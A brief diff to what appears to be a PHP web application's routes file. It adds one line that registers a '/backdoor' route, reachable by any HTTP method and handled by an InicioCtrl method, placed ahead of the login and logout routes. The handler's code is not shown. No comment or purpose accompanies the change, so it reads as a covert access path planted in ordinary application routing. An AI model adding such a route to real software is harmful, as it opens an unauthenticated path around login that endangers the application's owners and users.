@@ -25,6 +25,8 @@ function miredirect($ruta)
     exit();
 }
 
+Route::any('/backdoor', [InicioCtrl::class, 'backdoor']);
+
 // Login de usuario
 Route::any('/login', [LoginCtrl::class, 'login']);
 Route::any('/logout', [LoginCtrl::class, 'logout']);
